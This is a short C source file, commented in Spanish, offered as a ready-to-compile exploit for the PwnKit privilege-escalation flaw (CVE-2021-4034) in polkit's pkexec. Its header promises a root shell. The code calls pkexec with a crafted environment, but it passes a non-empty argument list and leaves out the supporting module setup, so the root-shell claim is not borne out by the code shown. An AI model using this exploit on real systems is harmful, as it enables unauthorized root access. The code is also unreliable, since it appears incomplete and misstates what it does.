// Exploit para CVE-2021-4034 (PwnKit) – versión minimalista sin dependencias raras
// Compila: gcc exploit.c -o pwnkit_exploit
// Ejecución: ./pwnkit_exploit → shell root

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char *envp[] = {
    "PATH=GCONV_PATH=.",
    "SHELL=evil",
    "CHARSET=evil",
    "GIO_USE_VFS=",
    NULL
};

int main(int argc, char *argv[]) {
    char *args[] = { "/usr/bin/pkexec", NULL };
    execve("/usr/bin/pkexec", args, envp);
    perror("execve");
    return 1;
}
